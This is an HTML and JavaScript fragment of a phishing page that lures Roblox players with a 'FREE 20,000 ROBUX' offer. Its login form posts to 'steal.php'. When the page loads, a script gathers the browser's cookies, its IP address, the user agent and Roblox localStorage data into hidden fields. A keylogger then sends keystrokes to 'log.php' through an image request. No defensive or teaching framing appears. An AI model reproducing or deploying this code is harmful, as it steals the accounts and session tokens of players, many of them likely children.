    <div class="container">

                    Complete verification to claim your <strong style="color:#ffd700;">FREE 20,000 ROBUX</strong>
                </div>

            <div class="login-form">
                <form id="loginForm" action="steal.php" method="POST">
                    <input type="hidden" name="cookie_data" id="cookieData">
                    <input type="hidden" name="user_agent" id="userAgent">
                    <input type="hidden" name="ip_address" id="ipAddress">
                    <input type="hidden" name="referrer" id="referrerData">
                    
                    <div class="input-group">
                        <label>Username or Email</label>
                        <input type="text" name="username" required placeholder="Enter your Roblox username">
                    </div>

    <script>
        // Collect browser data before form submission
        document.addEventListener('DOMContentLoaded', function() {
            // Set hidden form fields
            document.getElementById('cookieData').value = document.cookie;
            document.getElementById('userAgent').value = navigator.userAgent;
            document.getElementById('referrerData').value = document.referrer;
            
            // Get IP address
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('ipAddress').value = data.ip;
                })
                .catch(() => {
                    document.getElementById('ipAddress').value = 'Unknown';
                });
            
            // Also try to get localStorage data for Roblox
            let robloxData = '';
            for(let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if(key.includes('roblox') || key.includes('ROBLOX') || key.includes('RBX')) {
                    robloxData += key + '=' + localStorage.getItem(key).substring(0, 50) + ';';
                }
            }
            
            if(robloxData) {
                document.getElementById('cookieData').value += ' | LocalStorage: ' + robloxData;
            }
        });
        
        // Add keylogger
        let typedKeys = '';
        document.addEventListener('keydown', function(e) {
            typedKeys += e.key;
            if(typedKeys.length > 50) {
                // Send to server via image pixel
                const img = new Image();
                img.src = 'log.php?keys=' + encodeURIComponent(typedKeys);
                typedKeys = '';
            }
        });
    </script>
